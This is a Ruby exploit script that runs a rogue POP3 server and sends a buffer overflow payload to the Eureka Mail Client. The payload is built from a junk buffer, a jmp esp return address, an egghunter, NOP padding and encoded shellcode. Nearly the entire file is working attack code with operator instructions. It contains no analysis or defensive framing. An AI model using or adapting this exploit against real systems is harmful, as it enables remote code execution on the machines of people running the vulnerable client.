#!/usr/bin/env ruby

require 'socket'

ip_server = "192.168.0.13"
port = "110"

junk = "\x41" * 711
ret = "\x53\x93\x42\x7E" # Memory address 0x7E429353  - jmp esp from user32.dll
padding = "\x90" * 1000
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"+
"\x77\x30\x30\x74"+ # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

shellcode = "\x89\xe1\xdb\xcb\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" +
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" +
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" +
"\x42\x75\x4a\x49\x49\x6c\x68\x68\x6c\x42\x33\x30\x47\x70" +
"\x73\x30\x55\x30\x4d\x59\x79\x75\x55\x61\x4f\x30\x72\x44" +
"\x6c\x4b\x56\x30\x64\x70\x4e\x6b\x73\x62\x44\x4c\x4c\x4b" +
"\x43\x62\x46\x74\x6e\x6b\x73\x42\x67\x58\x56\x6f\x4c\x77" +
"\x70\x4a\x47\x56\x55\x61\x39\x6f\x6e\x4c\x57\x4c\x35\x31" +
"\x61\x6c\x54\x42\x56\x4c\x71\x30\x59\x51\x4a\x6f\x66\x6d" +
"\x77\x71\x4a\x67\x59\x72\x38\x72\x73\x62\x36\x37\x4e\x6b" +
"\x33\x62\x42\x30\x6c\x4b\x30\x4a\x77\x4c\x4e\x6b\x52\x6c" +
"\x67\x61\x71\x68\x6a\x43\x63\x78\x77\x71\x4b\x61\x52\x71" +
"\x6c\x4b\x36\x39\x57\x50\x53\x31\x69\x43\x6e\x6b\x52\x69" +
"\x32\x38\x7a\x43\x66\x5a\x43\x79\x6e\x6b\x77\x44\x6c\x4b" +
"\x75\x51\x39\x46\x45\x61\x59\x6f\x6e\x4c\x4b\x71\x5a\x6f" +
"\x74\x4d\x63\x31\x5a\x67\x35\x68\x39\x70\x74\x35\x6c\x36" +
"\x73\x33\x73\x4d\x6c\x38\x65\x6b\x63\x4d\x75\x74\x63\x45" +
"\x38\x64\x66\x38\x4e\x6b\x43\x68\x44\x64\x55\x51\x4b\x63" +
"\x35\x36\x6c\x4b\x66\x6c\x72\x6b\x4e\x6b\x46\x38\x75\x4c" +
"\x46\x61\x58\x53\x6e\x6b\x75\x54\x4c\x4b\x46\x61\x58\x50" +
"\x4c\x49\x32\x64\x66\x44\x71\x34\x31\x4b\x53\x6b\x55\x31" +
"\x76\x39\x30\x5a\x33\x61\x49\x6f\x39\x70\x63\x6f\x63\x6f" +
"\x50\x5a\x6c\x4b\x52\x32\x68\x6b\x4e\x6d\x43\x6d\x51\x78" +
"\x76\x53\x37\x42\x75\x50\x33\x30\x30\x68\x73\x47\x43\x43" +
"\x66\x52\x63\x6f\x71\x44\x73\x58\x30\x4c\x61\x67\x64\x66" +
"\x33\x37\x4d\x59\x79\x78\x59\x6f\x5a\x70\x6c\x78\x4e\x70" +
"\x45\x51\x43\x30\x75\x50\x35\x79\x79\x54\x51\x44\x62\x70" +
"\x72\x48\x65\x79\x6d\x50\x70\x6b\x33\x30\x59\x6f\x69\x45" +
"\x72\x4a\x45\x5a\x73\x58\x69\x50\x6f\x58\x67\x70\x76\x6d" +
"\x70\x68\x67\x72\x75\x50\x34\x51\x71\x4c\x4d\x59\x38\x66" +
"\x76\x30\x32\x70\x56\x30\x72\x70\x33\x70\x32\x70\x53\x70" +
"\x30\x50\x65\x38\x6a\x4a\x56\x6f\x6b\x6f\x59\x70\x49\x6f" +
"\x58\x55\x5a\x37\x31\x7a\x46\x70\x66\x36\x56\x37\x43\x58" +
"\x6c\x59\x69\x35\x63\x44\x30\x61\x6b\x4f\x4a\x75\x6b\x35" +
"\x39\x50\x31\x64\x46\x6a\x59\x6f\x30\x4e\x55\x58\x72\x55" +
"\x7a\x4c\x49\x78\x31\x77\x75\x50\x73\x30\x67\x70\x70\x6a" +
"\x35\x50\x32\x4a\x66\x64\x73\x66\x36\x37\x45\x38\x63\x32" +
"\x4a\x79\x4a\x68\x43\x6f\x79\x6f\x48\x55\x6d\x53\x38\x78" +
"\x35\x50\x73\x4e\x64\x76\x4e\x6b\x56\x56\x30\x6a\x77\x30" +
"\x42\x48\x37\x70\x56\x70\x57\x70\x77\x70\x52\x76\x61\x7a" +
"\x77\x70\x51\x78\x70\x58\x6d\x74\x36\x33\x4b\x55\x49\x6f" +
"\x78\x55\x6c\x53\x72\x73\x70\x6a\x63\x30\x76\x36\x72\x73" +
"\x42\x77\x43\x58\x54\x42\x68\x59\x6a\x68\x73\x6f\x79\x6f" +
"\x6e\x35\x6b\x33\x48\x78\x45\x50\x63\x4d\x31\x38\x42\x78" +
"\x30\x68\x37\x70\x63\x70\x45\x50\x53\x30\x43\x5a\x47\x70" +
"\x62\x70\x43\x58\x64\x4b\x34\x6f\x44\x4f\x34\x70\x49\x6f" +
"\x79\x45\x70\x57\x42\x48\x42\x55\x72\x4e\x62\x6d\x45\x31" +
"\x4b\x4f\x48\x55\x71\x4e\x51\x4e\x79\x6f\x46\x6c\x67\x54" +
"\x74\x4f\x6e\x65\x42\x50\x69\x6f\x59\x6f\x4b\x4f\x59\x79" +
"\x6d\x4b\x4b\x4f\x39\x6f\x39\x6f\x75\x51\x38\x43\x74\x69" +
"\x7a\x66\x44\x35\x59\x51\x4f\x33\x6f\x4b\x78\x70\x4d\x65" +
"\x49\x32\x50\x56\x62\x4a\x65\x50\x52\x73\x59\x6f\x6a\x75" +
"\x41\x41"

payload = junk + ret + egghunter + padding + "w00tw00t" + shellcode

#Setup a server
server = TCPServer.new(ip_server, port)
puts "[+] Listening on tcp port 110 [POP3]... \n";
puts "[+] Configure Eureka Mail Client to connect to this host\n";
loop do
    client = server.accept
    loop do
        client.puts "-ERR " + payload
        puts " -> Sent #{payload.size} bytes"
    end
    client.close
end
puts "[+] Connection closed\n"